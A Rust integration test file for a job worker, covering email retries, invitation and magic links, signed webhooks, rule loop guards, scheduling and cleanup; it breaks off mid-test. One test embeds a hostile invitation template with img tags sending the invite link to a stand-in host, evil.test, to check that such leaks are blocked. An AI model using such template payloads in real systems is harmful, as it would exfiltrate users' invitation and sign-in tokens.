//! The worker against a real database: publishing, jobs with retries,
//! email, webhooks, the scheduler and cleanup. Includes M2's demonstrable
//! outcome: a rule on `thing.created` sends a templated email through the
//! queue, with retries.

#![allow(clippy::unwrap_used, clippy::expect_used)]

#[path = "../../core-api/tests/common/mod.rs"]
mod common;

use std::sync::{Arc, Mutex};
use std::time::Duration;

use axum::http::{HeaderMap, StatusCode};
use common::{Client, TestApp};
use core_integrations::http::WebhookClient;
use core_integrations::mail::MemoryMailer;
use core_worker::{Settings, Worker};
use serde_json::{Value, json};
use sqlx::PgPool;
use sqlx::postgres::PgPoolOptions;
use tokio_util::sync::CancellationToken;

struct Harness {
    app: TestApp,
    worker: Worker,
    mailer: Arc<MemoryMailer>,
}

async fn harness(pool: PgPool) -> Harness {
    let app = TestApp::new(pool).await;
    let options = app.owner.connect_options().as_ref().clone();
    let queue = core_db::worker_pool_options(PgPoolOptions::new().max_connections(3))
        .connect_with(options)
        .await
        .unwrap();
    let mailer = Arc::new(MemoryMailer::default());
    let worker = Worker {
        app: app.state.clone(),
        queue,
        mailer: mailer.clone(),
        webhooks: WebhookClient::new(true).unwrap(),
        settings: Settings {
            concurrency: 4,
            backoff: |_| Duration::ZERO,
            ..Settings::default()
        },
    };
    Harness {
        app,
        worker,
        mailer,
    }
}

impl Harness {
    /// Publishes and runs until there is nothing left to do now.
    async fn drain(&self) {
        for _ in 0..50 {
            let published = self.worker.publish_once().await.unwrap();
            let ran = self.worker.run_jobs_once().await.unwrap();
            if published == 0 && ran == 0 {
                return;
            }
        }
        panic!("the queue did not settle");
    }

    async fn job_statuses(&self, kind: &str) -> Vec<String> {
        sqlx::query_scalar("SELECT status::text FROM jobs WHERE kind = $1 ORDER BY created_at")
            .bind(kind)
            .fetch_all(&self.app.owner)
            .await
            .unwrap()
    }

    async fn rule_outcomes(&self, rule: &str) -> Vec<(String, Option<String>)> {
        sqlx::query_as("SELECT outcome, reason FROM rule_runs WHERE rule_id = $1::uuid ORDER BY id")
            .bind(rule)
            .fetch_all(&self.app.owner)
            .await
            .unwrap()
    }
}

/// A workspace with a `client_email` field and a welcome template. The
/// owner's invitation email has already gone out.
async fn workspace(h: &Harness) -> Client {
    let (_, owner) = h.app.workspace_with_owner("acme").await;
    h.app
        .post("/api/v1/custom-fields")
        .signed_in(&owner)
        .json(json!({ "entity": "thing", "key": "client_email", "label": "Client email", "field_type": "email" }))
        .send()
        .await
        .ok();
    h.app
        .post("/api/v1/templates")
        .signed_in(&owner)
        .json(json!({
            "kind": "email", "key": "welcome", "name": "Welcome",
            "subject": "Welcome aboard, {{ thing.name }}",
            "body": "<p>Hello from {{ workspace.name }}.</p><p><a href=\"{{ thing.url }}\">Open {{ thing.name }}</a></p>"
        }))
        .send()
        .await
        .ok();
    h.drain().await;
    owner
}

async fn welcome_rule(h: &Harness, owner: &Client) -> String {
    let rule = h
        .app
        .post("/api/v1/rules")
        .signed_in(owner)
        .json(json!({
            "name": "Welcome new clients",
            "trigger": { "kind": "event", "topic": "thing.created" },
            "conditions": { "field": "thing.custom.client_email", "op": "is_not_empty" },
            "actions": [{ "type": "send_email", "template": "welcome", "to": { "field": "thing.custom.client_email" } }]
        }))
        .send()
        .await
        .ok();
    rule.body["id"].as_str().unwrap().to_owned()
}

#[sqlx::test(migrator = "core_db::MIGRATOR")]
async fn a_rule_on_thing_created_sends_a_templated_email_with_retries(pool: PgPool) {
    let h = harness(pool).await;
    let owner = workspace(&h).await;
    let rule = welcome_rule(&h, &owner).await;
    let before = h.mailer.sent().len();

    // The mail server is down for the first two tries.
    h.mailer.fail_next(2);
    h.app
        .post("/api/v1/things")
        .signed_in(&owner)
        .json(json!({ "name": "Spring campaign", "custom": { "client_email": "ana@client.test" } }))
        .send()
        .await
        .ok();
    // No email to send for this one: the condition does not match.
    h.app
        .post("/api/v1/things")
        .signed_in(&owner)
        .json(json!({ "name": "No contact yet" }))
        .send()
        .await
        .ok();
    h.drain().await;

    let sent = h.mailer.sent();
    assert_eq!(sent.len(), before + 1);
    let email = sent.last().unwrap();
    assert_eq!(email.to, "ana@client.test");
    assert_eq!(email.subject, "Welcome aboard, Spring campaign");
    assert_eq!(email.from_name.as_deref(), Some("acme agency"));
    assert!(
        email
            .html
            .as_deref()
            .unwrap()
            .contains("Hello from acme agency.")
    );
    assert!(email.text.contains("Hello from acme agency."));

    // One job, three attempts: two failures, then success.
    assert_eq!(h.job_statuses("mail.send").await, ["succeeded"]);
    let runs: Vec<(i32, bool, Option<String>)> = sqlx::query_as(
        "SELECT r.attempt, r.succeeded, r.error FROM job_runs r JOIN jobs j ON j.id = r.job_id
         WHERE j.kind = 'mail.send' ORDER BY r.attempt",
    )
    .fetch_all(&h.app.owner)
    .await
    .unwrap();
    assert_eq!(runs.len(), 3);
    assert_eq!((runs[0].0, runs[0].1), (1, false));
    assert!(runs[0].2.as_deref().unwrap().contains("try again later"));
    assert_eq!((runs[2].0, runs[2].1), (3, true));

    // The rule's log explains both records.
    let mut outcomes = h.rule_outcomes(&rule).await;
    outcomes.sort();
    assert_eq!(outcomes.len(), 2);
    assert_eq!(outcomes[0].0, "acted");
    assert_eq!(outcomes[1].0, "skipped");
    assert!(
        outcomes[1].1.as_deref().unwrap().contains("client_email"),
        "{outcomes:?}"
    );

    // And the workspace sees it all through the API.
    let messages = h
        .app
        .get("/api/v1/messages")
        .signed_in(&owner)
        .send()
        .await
        .ok();
    let m = &messages.body["messages"][0];
    assert_eq!(m["to"], "ana@client.test");
    assert_eq!(m["status"], "sent");
    assert_eq!(m["template_key"], "welcome");
    assert_eq!(m["rule_id"], rule);
    let log = h
        .app
        .get(&format!("/api/v1/rules/{rule}/log"))
        .signed_in(&owner)
        .send()
        .await
        .ok();
    let acted = log.body["runs"]
        .as_array()
        .unwrap()
        .iter()
        .find(|r| r["outcome"] == "acted")
        .unwrap();
    assert_eq!(acted["actions"][0]["type"], "send_email");
    let job = m["job_id"].as_str().unwrap();
    let detail = h
        .app
        .get(&format!("/api/v1/jobs/{job}"))
        .signed_in(&owner)
        .send()
        .await
        .ok();
    assert_eq!(detail.body["runs"].as_array().unwrap().len(), 3);
}

#[sqlx::test(migrator = "core_db::MIGRATOR")]
async fn invitations_and_sign_in_links_are_emailed(pool: PgPool) {
    let h = harness(pool).await;
    let (_, token) = h.app.create_workspace("acme", "boss@acme.test").await;
    h.drain().await;

    let sent = h.mailer.sent();
    assert_eq!(sent.len(), 1);
    assert_eq!(sent[0].to, "boss@acme.test");
    assert!(
        sent[0].subject.contains("acme agency"),
        "{}",
        sent[0].subject
    );
    assert!(
        sent[0].text.contains(&token),
        "the email carries the join link: {}",
        sent[0].text
    );

    // The link worked through the email is the one that signs up.
    h.app.accept_new(&token, "Boss").await;
    h.app
        .post("/api/v1/auth/magic-link")
        .json(json!({ "email": "boss@acme.test" }))
        .send()
        .await;
    h.drain().await;
    let sent = h.mailer.sent();
    assert_eq!(sent.len(), 2);
    let magic = common::token_from_url(
        sent[1]
            .text
            .split_whitespace()
            .find(|w| w.contains("token="))
            .expect("a link in the email"),
    );
    let res = h
        .app
        .post("/api/v1/auth/magic-link/consume")
        .json(json!({ "token": magic }))
        .send()
        .await;
    assert_eq!(res.status, StatusCode::OK, "{}", res.body);

    // Links are kept out of everything stored: outbox, queue and message log.
    let secrets: i64 = sqlx::query_scalar(
        "SELECT (SELECT count(*) FROM outbox WHERE secret IS NOT NULL) + (SELECT count(*) FROM jobs WHERE secret IS NOT NULL)",
    )
    .fetch_one(&h.app.owner)
    .await
    .unwrap();
    assert_eq!(secrets, 0);
    let stored: Vec<String> = sqlx::query_scalar("SELECT body_text FROM outbound_messages")
        .fetch_all(&h.app.owner)
        .await
        .unwrap();
    assert_eq!(stored.len(), 2);
    for body in stored {
        assert!(!body.contains(&token) && !body.contains(&magic), "{body}");
    }
}

#[sqlx::test(migrator = "core_db::MIGRATOR")]
async fn a_custom_invitation_template_cannot_leak_the_link(pool: PgPool) {
    let h = harness(pool).await;
    let (ws, owner) = h.app.workspace_with_owner("acme").await;
    // An admin's template tries to get the link into the stored copy, or
    // off to another site. Saving it is refused; one saved before that
    // check (inserted here directly) still cannot carry the link.
    let body = "<p><a href=\"{{ invitation.url }}\">Join</a></p>\
                <p>{{ invitation.url[:20] }}<!---->{{ invitation.url[20:] }}</p>\
                <p>{{ invitation.url | urlencode }} {{ invitation.url | reverse }}</p>\
                <img src=\"https://evil.test/?u={{ invitation.url }}\">\
                <img src=\"https://evil.test/?v=>{{ invitation.url }}\">\
                <img src='https://evil.test/?w= href=\"{{ invitation.url }}'>";
    h.app
        .post("/api/v1/templates")
        .signed_in(&owner)
        .json(json!({
            "kind": "email", "key": "system.invitation", "name": "Invitation",
            "subject": "Join {{ invitation.url }}", "body": body,
        }))
        .send()
        .await
        .expect(axum::http::StatusCode::BAD_REQUEST, "invalid_input");
    sqlx::query(
        "INSERT INTO templates (id, workspace_id, kind, key, locale, name, subject, body)
         VALUES (gen_random_uuid(), $1, 'email', 'system.invitation', 'en', 'Invitation', $2, $3)",
    )
    .bind(ws.0)
    .bind("Join {{ invitation.url }}")
    .bind(body)
    .execute(&h.app.owner)
    .await
    .unwrap();
    h.app
        .post("/api/v1/invitations")
        .signed_in(&owner)
        .json(json!({ "email": "new@acme.test", "role": "agent" }))
        .send()
        .await
        .ok();
    let token = h.app.last_invitation_token(ws).await;
    h.drain().await;

    let sent = h.mailer.sent();
    let email = sent.iter().find(|e| e.to == "new@acme.test").unwrap();
    let html = email.html.as_deref().unwrap();
    assert!(
        email.subject.contains(&token) && html.contains("href=\"http"),
        "the invitee still gets a working link: {html}"
    );
    // The token only ever appears as the whole link, never reshaped or
    // inside another address.
    let link = format!("/invitations/accept?token={token}");
    assert!(
        !html.replace(&link, "").contains(&token[..12]),
        "only as the link: {html}"
    );
    for q in ["u=http", "v=>http"] {
        assert!(!html.contains(&format!("evil.test/?{q}")), "{html}");
    }
    assert!(!html.contains("w= href=\"http"), "{html}");

    let stored: Vec<(String, String, String)> = sqlx::query_as(
        "SELECT coalesce(subject, ''), coalesce(body_html, ''), body_text FROM outbound_messages WHERE to_address = 'new@acme.test'",
    )
    .fetch_all(&h.app.owner)
    .await
    .unwrap();
    assert_eq!(stored.len(), 1);
    let (subject, html, text) = &stored[0];
    for part in [subject, html, text] {
        assert!(!part.contains(&token[..12]), "{part}");
    }
}

#[sqlx::test(migrator = "core_db::MIGRATOR")]
async fn permanent_failures_stop_at_once_and_can_be_retried(pool: PgPool) {
    let h = harness(pool).await;
    let owner = workspace(&h).await;
    welcome_rule(&h, &owner).await;
    h.mailer.reject_all();
    h.app
        .post("/api/v1/things")
        .signed_in(&owner)
        .json(json!({ "name": "Bounced", "custom": { "client_email": "gone@client.test" } }))
        .send()
        .await
        .ok();
    h.drain().await;

    assert_eq!(h.job_statuses("mail.send").await, ["dead"]);
    let attempts: i32 = sqlx::query_scalar("SELECT attempts FROM jobs WHERE kind = 'mail.send'")
        .fetch_one(&h.app.owner)
        .await
        .unwrap();
    assert_eq!(attempts, 1, "a permanent refusal is not retried");
    let messages = h
        .app
        .get("/api/v1/messages")
        .signed_in(&owner)
        .send()
        .await
        .ok();
    assert_eq!(messages.body["messages"][0]["status"], "failed");
    assert!(
        messages.body["messages"][0]["error"]
            .as_str()
            .unwrap()
            .contains("550")
    );

    let dead = h
        .app
        .get("/api/v1/jobs?status=dead")
        .signed_in(&owner)
        .send()
        .await
        .ok();
    let job = dead.body["jobs"][0]["id"].as_str().unwrap().to_owned();
    let retried = h
        .app
        .post(&format!("/api/v1/jobs/{job}/retry"))
        .signed_in(&owner)
        .send()
        .await
        .ok();
    assert_eq!(retried.body["status"], "queued");
    assert_eq!(retried.body["attempts"], 0);
    assert!(
        h.app
            .audit_actions(owner.workspace.unwrap())
            .await
            .contains(&"job.retried".to_owned())
    );
}

#[sqlx::test(migrator = "core_db::MIGRATOR")]
async fn temporary_failures_give_up_after_the_last_attempt(pool: PgPool) {
    let h = harness(pool).await;
    let owner = workspace(&h).await;
    welcome_rule(&h, &owner).await;
    h.mailer.fail_next(100);
    h.app
        .post("/api/v1/things")
        .signed_in(&owner)
        .json(json!({ "name": "Unlucky", "custom": { "client_email": "ana@client.test" } }))
        .send()
        .await
        .ok();
    h.drain().await;
    assert_eq!(h.job_statuses("mail.send").await, ["dead"]);
    let runs: i64 = sqlx::query_scalar(
        "SELECT count(*) FROM job_runs r JOIN jobs j ON j.id = r.job_id WHERE j.kind = 'mail.send'",
    )
    .fetch_one(&h.app.owner)
    .await
    .unwrap();
    assert_eq!(runs, 10);
    // The failure is logged once, not once per attempt.
    let failed: i64 =
        sqlx::query_scalar("SELECT count(*) FROM outbound_messages WHERE status = 'failed'")
            .fetch_one(&h.app.owner)
            .await
            .unwrap();
    assert_eq!(failed, 1);
}

/// One request a test endpoint received: its headers and body.
type Call = (HeaderMap, Vec<u8>);

#[derive(Clone, Default)]
struct Receiver {
    calls: Arc<Mutex<Vec<Call>>>,
}

async fn receive(
    axum::extract::State(r): axum::extract::State<Receiver>,
    headers: HeaderMap,
    body: axum::body::Bytes,
) -> StatusCode {
    let mut calls = r.calls.lock().unwrap();
    calls.push((headers, body.to_vec()));
    // Down the first time.
    if calls.len() == 1 {
        StatusCode::SERVICE_UNAVAILABLE
    } else {
        StatusCode::OK
    }
}

async fn receiver() -> (Receiver, String) {
    let r = Receiver::default();
    let app = axum::Router::new()
        .route("/hook", axum::routing::post(receive))
        .with_state(r.clone());
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let url = format!("http://{}/hook", listener.local_addr().unwrap());
    tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
    (r, url)
}

#[sqlx::test(migrator = "core_db::MIGRATOR")]
async fn webhooks_are_signed_and_retried(pool: PgPool) {
    let h = harness(pool).await;
    let owner = workspace(&h).await;
    let (receiver, url) = receiver().await;
    let created = h
        .app
        .post("/api/v1/webhooks")
        .signed_in(&owner)
        .json(json!({ "url": url, "events": ["thing.created"] }))
        .send()
        .await
        .ok();
    let secret = created.body["secret"].as_str().unwrap().to_owned();
    let id = created.body["webhook"]["id"].as_str().unwrap().to_owned();
    let thing = h
        .app
        .post("/api/v1/things")
        .signed_in(&owner)
        .json(json!({ "name": "Hooked" }))
        .send()
        .await
        .ok();
    h.drain().await;

    let calls = receiver.calls.lock().unwrap().clone();
    assert_eq!(calls.len(), 2, "one failure, one retry");
    let (headers, body) = &calls[1];
    let signature = headers["onhold-signature"].to_str().unwrap();
    let now = chrono::Utc::now().timestamp();
    assert!(core_engines::webhooks::verify(
        &secret, signature, body, now, 300
    ));
    assert!(!core_engines::webhooks::verify(
        "whsec_wrong",
        signature,
        body,
        now,
        300
    ));
    assert_eq!(headers["onhold-delivery-attempt"], "2");
    let event: Value = serde_json::from_slice(body).unwrap();
    assert_eq!(event["topic"], "thing.created");
    assert_eq!(event["workspace_id"], owner.workspace.unwrap().to_string());
    assert_eq!(event["data"]["object_id"], thing.body["id"]);
    assert_eq!(headers["onhold-event-id"], event["id"].as_str().unwrap());

    let log = h
        .app
        .get(&format!("/api/v1/webhooks/{id}/deliveries"))
        .signed_in(&owner)
        .send()
        .await
        .ok();
    let d = log.body["deliveries"].as_array().unwrap();
    assert_eq!(d.len(), 2);
    assert_eq!(
        (
            d[0]["attempt"].as_i64(),
            d[0]["status_code"].as_i64(),
            d[0]["succeeded"].as_bool()
        ),
        (Some(2), Some(200), Some(true))
    );
    assert_eq!(
        (d[1]["status_code"].as_i64(), d[1]["succeeded"].as_bool()),
        (Some(503), Some(false))
    );
    assert_eq!(d[0]["topic"], "thing.created");

    // A ping goes to this endpoint only, even though it does not subscribe to pings.
    h.app
        .post(&format!("/api/v1/webhooks/{id}/ping"))
        .signed_in(&owner)
        .send()
        .await
        .ok();
    h.drain().await;
    let calls = receiver.calls.lock().unwrap().clone();
    let ping: Value = serde_json::from_slice(&calls[2].1).unwrap();
    assert_eq!(ping["topic"], "webhook.ping");
}

#[sqlx::test(migrator = "core_db::MIGRATOR")]
async fn rules_cannot_trigger_each_other_forever(pool: PgPool) {
    let h = harness(pool).await;
    let owner = workspace(&h).await;
    // Each undoes the other, so every update causes two more.
    let mut rules = Vec::new();
    for (name, value) in [("Ping", "ping"), ("Pong", "pong")] {
        let rule = h
            .app
            .post("/api/v1/rules")
            .signed_in(&owner)
            .json(json!({
                "name": name, "once_per_object": false,
                "trigger": { "kind": "event", "topic": "thing.updated" },
                "actions": [{ "type": "set_field", "field": "name", "value": value }]
            }))
            .send()
            .await
            .ok();
        rules.push(rule.body["id"].as_str().unwrap().to_owned());
    }
    let thing = h
        .app
        .post("/api/v1/things")
        .signed_in(&owner)
        .json(json!({ "name": "start" }))
        .send()
        .await
        .ok();
    h.app
        .patch(&format!(
            "/api/v1/things/{}",
            thing.body["id"].as_str().unwrap()
        ))
        .signed_in(&owner)
        .json(json!({ "name": "touched" }))
        .send()
        .await
        .ok();
    // Settling at all is the point: the chain stops at the depth limit.
    h.drain().await;

    // One event at depth 0, two at 1, four at 2: seven runs each. The
    // eight events at depth 3 are refused.
    let outcomes = h.rule_outcomes(&rules[0]).await;
    let acted = outcomes.iter().filter(|(o, _)| o == "acted").count();
    let stopped = outcomes
        .iter()
        .filter(|(o, why)| {
            o == "skipped" && why.as_deref().is_some_and(|w| w.contains("loop guard"))
        })
        .count();
    assert_eq!((acted, stopped, outcomes.len()), (7, 8, 15), "{outcomes:?}");
    let depths: Vec<i32> = sqlx::query_scalar(
        "SELECT DISTINCT (payload->'actor'->>'rule_depth')::int FROM outbox WHERE topic = 'thing.updated' ORDER BY 1",
    )
    .fetch_all(&h.app.owner)
    .await
    .unwrap();
    // 0 is the person's edit; rules acted on events up to depth 2, and the
    // depth-3 events they caused were left alone.
    assert_eq!(depths, [0, 1, 2, 3]);

    // Changes made by a rule are audited as the rule's.
    let by_rule: i64 =
        sqlx::query_scalar("SELECT count(*) FROM audit_log WHERE actor_rule_id = $1::uuid")
            .bind(&rules[0])
            .fetch_one(&h.app.owner)
            .await
            .unwrap();
    assert!(by_rule > 0);
}

#[sqlx::test(migrator = "core_db::MIGRATOR")]
async fn paused_workspaces_run_no_rules(pool: PgPool) {
    let h = harness(pool).await;
    let owner = workspace(&h).await;
    let rule = welcome_rule(&h, &owner).await;
    h.app
        .put("/api/v1/automations")
        .signed_in(&owner)
        .json(json!({ "paused": true }))
        .send()
        .await
        .ok();
    let before = h.mailer.sent().len();
    h.app
        .post("/api/v1/things")
        .signed_in(&owner)
        .json(json!({ "name": "Quiet", "custom": { "client_email": "ana@client.test" } }))
        .send()
        .await
        .ok();
    h.drain().await;
    assert_eq!(h.mailer.sent().len(), before);
    assert_eq!(
        h.rule_outcomes(&rule).await,
        [(
            "skipped".to_owned(),
            Some("automations are paused".to_owned())
        )]
    );
}

#[sqlx::test(migrator = "core_db::MIGRATOR")]
async fn the_scheduler_runs_date_and_cron_rules(pool: PgPool) {
    let h = harness(pool).await;
    let owner = workspace(&h).await;
    h.app
        .post("/api/v1/pipelines")
        .signed_in(&owner)
        .json(json!({ "entity": "thing", "name": "Work", "stages": [{ "key": "todo", "name": "To do" }, { "key": "late", "name": "Late" }] }))
        .send()
        .await
        .ok();
    let overdue = h
        .app
        .post("/api/v1/rules")
        .signed_in(&owner)
        .json(json!({
            "name": "Overdue",
            "trigger": { "kind": "date_offset", "entity": "thing", "field": "due_at", "offset_minutes": 0 },
            "actions": [{ "type": "move_stage", "stage": "late" }]
        }))
        .send()
        .await
        .ok();
    let overdue = overdue.body["id"].as_str().unwrap().to_owned();
    let weekly = h
        .app
        .post("/api/v1/rules")
        .signed_in(&owner)
        .json(json!({
            "name": "Weekly digest",
            "trigger": { "kind": "schedule", "cron": "0 9 * * 1" },
            "actions": [{ "type": "send_email", "template": "welcome", "to": { "role": "owner" } }]
        }))
        .send()
        .await
        .ok();
    let weekly = weekly.body["id"].as_str().unwrap().to_owned();

    // Due just now: after the rule was saved, before the scheduler looks.
    let thing = h
        .app
        .post("/api/v1/things")
        .signed_in(&owner)
        .json(json!({ "name": "Report", "due_at": chrono::Utc::now() }))
        .send()
        .await
        .ok();
    let later = h
        .app
        .post("/api/v1/things")
        .signed_in(&owner)
        .json(json!({ "name": "Next year", "due_at": chrono::Utc::now() + chrono::Duration::days(365) }))
        .send()
        .await
        .ok();
    h.drain().await;
    // Pretend Monday 9am came.
    sqlx::query("UPDATE rules SET next_run_at = now() - interval '1 minute' WHERE id = $1::uuid")
        .bind(&weekly)
        .execute(&h.app.owner)
        .await
        .unwrap();
    tokio::time::sleep(Duration::from_millis(20)).await;
    assert_eq!(h.worker.schedule_once().await.unwrap(), Some(2));
    h.drain().await;

    let get = |id: &Value| {
        h.app
            .get(&format!("/api/v1/things/{}", id.as_str().unwrap()))
            .signed_in(&owner)
            .send()
    };
    assert_eq!(get(&thing.body["id"]).await.ok().body["stage"], "late");
    assert_eq!(get(&later.body["id"]).await.ok().body["stage"], "todo");
    assert_eq!(h.rule_outcomes(&overdue).await.len(), 1);
    assert_eq!(h.rule_outcomes(&weekly).await[0].0, "acted");
    assert!(
        h.mailer
            .sent()
            .iter()
            .any(|m| m.to == "owner@acme.test" && m.subject.starts_with("Welcome aboard"))
    );

    // Both are due again later, and nothing is queued twice.
    let next: Vec<chrono::DateTime<chrono::Utc>> =
        sqlx::query_scalar("SELECT next_run_at FROM rules ORDER BY created_at")
            .fetch_all(&h.app.owner)
            .await
            .unwrap();
    assert!(next.iter().all(|t| *t > chrono::Utc::now()));
    assert_eq!(h.worker.schedule_once().await.unwrap(), Some(0));
}

#[sqlx::test(migrator = "core_db::MIGRATOR")]
async fn jobs_of_a_stopped_worker_are_picked_up_again(pool: PgPool) {
    let h = harness(pool).await;
    h.app.create_workspace("acme", "boss@acme.test").await;
    h.worker.publish_once().await.unwrap();
    // Claimed, then the worker vanished.
    let claimed = h.worker.claim(10).await.unwrap();
    assert!(!claimed.is_empty());
    sqlx::query(
        "UPDATE jobs SET locked_until = now() - interval '1 second' WHERE status = 'running'",
    )
    .execute(&h.app.owner)
    .await
    .unwrap();
    h.worker.schedule_once().await.unwrap();
    let running: i64 = sqlx::query_scalar("SELECT count(*) FROM jobs WHERE status = 'running'")
        .fetch_one(&h.app.owner)
        .await
        .unwrap();
    assert_eq!(running, 0);
    h.drain().await;
    assert_eq!(h.mailer.sent().len(), 1);
}

#[sqlx::test(migrator = "core_db::MIGRATOR")]
async fn cleanup_deletes_old_data_and_expires_old_cursors(pool: PgPool) {
    let h = harness(pool).await;
    let owner = workspace(&h).await;
    let latest = h
        .app
        .get("/api/v1/events")
        .signed_in(&owner)
        .send()
        .await
        .ok()
        .body["latest"]
        .as_i64()
        .unwrap();
    sqlx::query("UPDATE outbox SET processed_at = now() - interval '31 days'")
        .execute(&h.app.owner)
        .await
        .unwrap();
    sqlx::query("UPDATE jobs SET finished_at = now() - interval '8 days'")
        .execute(&h.app.owner)
        .await
        .unwrap();
    h.worker.cleanup_once().await.unwrap();

    let left: i64 =
        sqlx::query_scalar("SELECT (SELECT count(*) FROM outbox) + (SELECT count(*) FROM jobs)")
            .fetch_one(&h.app.owner)
            .await
            .unwrap();
    assert_eq!(left, 0);
    h.app
        .get("/api/v1/events?after=1")
        .signed_in(&owner)
        .send()
        .await
        .expect(StatusCode::GONE, "cursor_expired");
    let page = h
        .app
        .get(&format!("/api/v1/events?after={latest}"))
        .signed_in(&owner)
        .send()
        .await
        .ok();
    assert!(page.body["events"].as_array().unwrap().is_empty());
    assert_eq!(page.body["latest"], latest);
}

#[sqlx::test(migrator = "core_db::MIGRATOR")]
async fn cleanup_clears_old_logs_payloads_and_sign_ins(pool: PgPool) {
    let h = harness(pool).await;
    let owner = workspace(&h).await;
    let ws = owner.workspace.unwrap().0;
    // A dead job with its run, a delivery, and a rule that did nothing,
    // all from 31 days ago; and the same from yesterday.
    sqlx::raw_sql(sqlx::AssertSqlSafe(format!(
        r#"DELETE FROM jobs;
           INSERT INTO jobs (id, workspace_id, kind, payload, status, finished_at) VALUES
               ('00000000-0000-0000-0000-0000000000a1', '{ws}', 'test.dead', '{{}}', 'dead', now() - interval '31 days'),
               ('00000000-0000-0000-0000-0000000000a2', '{ws}', 'test.dead', '{{}}', 'dead', now() - interval '1 day');
           INSERT INTO job_runs (id, job_id, workspace_id, attempt, started_at, succeeded)
               VALUES ('00000000-0000-0000-0000-0000000000b1', '00000000-0000-0000-0000-0000000000a1', '{ws}', 1, now(), false);
           INSERT INTO webhook_endpoints (id, workspace_id, url, events, secret_enc)
               VALUES ('00000000-0000-0000-0000-0000000000c1', '{ws}', 'https://hooks.test/x', '{{*}}', '\x00');
           INSERT INTO webhook_deliveries (id, workspace_id, endpoint_id, event_id, attempt, succeeded, duration_ms, created_at) VALUES
               ('00000000-0000-0000-0000-0000000000c2', '{ws}', '00000000-0000-0000-0000-0000000000c1', gen_random_uuid(), 1, false, 5, now() - interval '31 days'),
               ('00000000-0000-0000-0000-0000000000c3', '{ws}', '00000000-0000-0000-0000-0000000000c1', gen_random_uuid(), 1, false, 5, now() - interval '1 day');
           INSERT INTO rules (id, workspace_id, name, trigger, trigger_kind, actions)
               VALUES ('00000000-0000-0000-0000-0000000000d1', '{ws}', 'Quiet', '{{"kind": "event", "topic": "thing.created"}}', 'event', '[]');
           INSERT INTO rule_runs (id, workspace_id, rule_id, outcome, created_at) VALUES
               ('00000000-0000-0000-0000-0000000000d2', '{ws}', '00000000-0000-0000-0000-0000000000d1', 'skipped', now() - interval '31 days'),
               ('00000000-0000-0000-0000-0000000000d3', '{ws}', '00000000-0000-0000-0000-0000000000d1', 'acted', now() - interval '31 days'),
               ('00000000-0000-0000-0000-0000000000d4', '{ws}', '00000000-0000-0000-0000-0000000000d1', 'skipped', now() - interval '1 day');
           INSERT INTO stripe_events (id, workspace_id, type, payload, processed_at) VALUES
               ('evt_old', '{ws}', 'checkout.session.completed', '{{"big": true}}', now() - interval '91 days'),
               ('evt_new', '{ws}', 'checkout.session.completed', '{{"big": true}}', now() - interval '1 day'),
               ('evt_waiting', '{ws}', 'checkout.session.completed', '{{"big": true}}', NULL);
           UPDATE sessions SET expires_at = now() - interval '31 days'
               WHERE id = (SELECT id FROM sessions ORDER BY created_at LIMIT 1);"#
    )))
    .execute(&h.app.owner)
    .await
    .unwrap();
    let sessions: i64 = sqlx::query_scalar("SELECT count(*) FROM sessions")
        .fetch_one(&h.app.owner)
        .await
        .unwrap();

    h.worker.cleanup_once().await.unwrap();

    let ids = |sql: &'static str| {
        let pool = h.app.owner.clone();
        async move {
            sqlx::query_scalar::<_, String>(sql)
                .fetch_all(&pool)
                .await
                .unwrap()
        }
    };
    assert_eq!(
        ids("SELECT right(id::text, 2) FROM jobs ORDER BY id").await,
        ["a2"]
    );
    assert_eq!(
        ids("SELECT right(id::text, 2) FROM job_runs").await,
        Vec::<String>::new()
    );
    assert_eq!(
        ids("SELECT right(id::text, 2) FROM webhook_deliveries").await,
        ["c3"]
    );
    assert_eq!(
        ids("SELECT right(id::text, 2) FROM rule_runs ORDER BY id").await,
        ["d3", "d4"]
    );
    assert_eq!(
        ids("SELECT id || ' ' || payload::text FROM stripe_events ORDER BY id").await,
        [
            r#"evt_new {"big": true}"#,
            "evt_old {}",
            r#"evt_waiting {"big": true}"#
        ]
    );
    let left: i64 = sqlx::query_scalar("SELECT count(*) FROM sessions")
        .fetch_one(&h.app.owner)
        .await
        .unwrap();
    assert_eq!(left, sessions - 1);
}

#[sqlx::test(migrator = "core_db::MIGRATOR")]
async fn workspaces_take_turns_at_the_queue(pool: PgPool) {
    let h = harness(pool).await;
    let (busy, _) = h.app.create_workspace("busy", "boss@busy.test").await;
    let (quiet, _) = h.app.create_workspace("quiet", "boss@quiet.test").await;
    sqlx::query("DELETE FROM jobs")
        .execute(&h.app.owner)
        .await
        .unwrap();
    // A big import's worth of work queued an hour ago, then one timed job
    // elsewhere.
    sqlx::query(
        "INSERT INTO jobs (id, workspace_id, kind, payload, run_at)
         SELECT gen_random_uuid(), $1, 'test.busy', '{}', now() - interval '1 hour' + n * interval '1 ms'
         FROM generate_series(1, 50) n",
    )
    .bind(busy.0)
    .execute(&h.app.owner)
    .await
    .unwrap();
    sqlx::query(
        "INSERT INTO jobs (id, workspace_id, kind, payload) VALUES (gen_random_uuid(), $1, 'test.quiet', '{}')",
    )
    .bind(quiet.0)
    .execute(&h.app.owner)
    .await
    .unwrap();

    let first = h.worker.claim(2).await.unwrap();
    let kinds: Vec<&str> = first.iter().map(|j| j.kind.as_str()).collect();
    assert!(kinds.contains(&"test.quiet"), "{kinds:?}");

    // With more of the busy workspace's work running, a free slot goes to
    // whoever has less running, even work queued later.
    sqlx::query("UPDATE jobs SET status = 'succeeded' WHERE kind = 'test.quiet'")
        .execute(&h.app.owner)
        .await
        .unwrap();
    let more = h.worker.claim(3).await.unwrap();
    assert!(more.iter().all(|j| j.kind == "test.busy"));
    sqlx::query(
        "INSERT INTO jobs (id, workspace_id, kind, payload) VALUES (gen_random_uuid(), $1, 'test.quiet', '{}')",
    )
    .bind(quiet.0)
    .execute(&h.app.owner)
    .await
    .unwrap();
    let next = h.worker.claim(1).await.unwrap();
    assert_eq!(next[0].kind, "test.quiet");
}

#[sqlx::test(migrator = "core_db::MIGRATOR")]
async fn the_running_worker_reacts_to_new_work_and_stops_cleanly(pool: PgPool) {
    let h = harness(pool).await;
    let shutdown = CancellationToken::new();
    let running = tokio::spawn(core_worker::run(h.worker.clone(), shutdown.clone()));

    h.app.create_workspace("acme", "boss@acme.test").await;
    let deadline = tokio::time::Instant::now() + Duration::from_secs(10);
    while h.mailer.sent().is_empty() {
        assert!(
            tokio::time::Instant::now() < deadline,
            "the invitation was not sent"
